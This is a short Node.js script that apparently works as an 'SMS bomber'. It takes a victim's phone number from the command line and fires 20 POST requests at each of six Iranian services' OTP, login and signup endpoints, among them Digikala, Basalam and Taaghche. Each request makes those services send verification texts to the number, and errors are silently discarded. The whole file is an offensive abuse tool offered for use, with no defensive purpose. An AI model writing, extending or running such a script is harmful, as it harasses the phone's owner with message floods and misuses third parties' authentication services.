const axios = require("axios");

function sendRequests(mobileNo) {
  const requests = [
    {
      url: "https://gharar.ir/users/phone_number/",
      payload: {
        phone: mobileNo,
      },
      useFormData: false,
    },
    {
      url: "https://api.digikala.com/v1/user/authenticate/",
      payload: {
        backUrl: "/",
        username: mobileNo,
        otp_call: false,
      },
      useFormData: false,
    },
    {
      url: "https://auth.basalam.com/otp-request",
      payload: {
        mobile: mobileNo,
        client_id: 23,
      },
      useFormData: false,
    },
    {
      url: "https://gw.taaghche.com/v4/site/auth/signup",
      payload: {
        contact: mobileNo,
      },
      useFormData: false,
    },
    {
      url: "https://gw.taaghche.com/v4/site/auth/login",
      payload: {
        contact: mobileNo,
        forceOtp: false,
      },
      useFormData: false,
    },
    {
      url: "https://api.vesal.co/v2/auth/login",
      payload: new URLSearchParams({
        mobile: mobileNo,
      }),
      useFormData: true,
    },
    // Add more objects here as needed
  ];

  const loopCount = 20; // Number of requests per object

  for (let i = 0; i < requests.length; i++) {
    const { url, payload, useFormData } = requests[i];

    for (let j = 0; j < loopCount; j++) {
      const requestConfig = {
        url,
        method: "post",
        data: useFormData ? payload : JSON.stringify(payload),
        headers: useFormData
          ? { "Content-Type": "application/x-www-form-urlencoded" }
          : { "Content-Type": "application/json" },
      };

      axios(requestConfig)
        .then((response) => {
          console.log(
            `Request ${i + 1}-${j + 1} successful. Response:`,
            response.data
          );
        })
        .catch((error) => {});
    }
  }
}

// Check if a mobile number is provided as a command-line argument
const mobileNo = process.argv[2];
if (!mobileNo) {
  console.error("Please provide a mobile number as a command-line argument.");
  process.exit(1);
}

sendRequests(mobileNo);
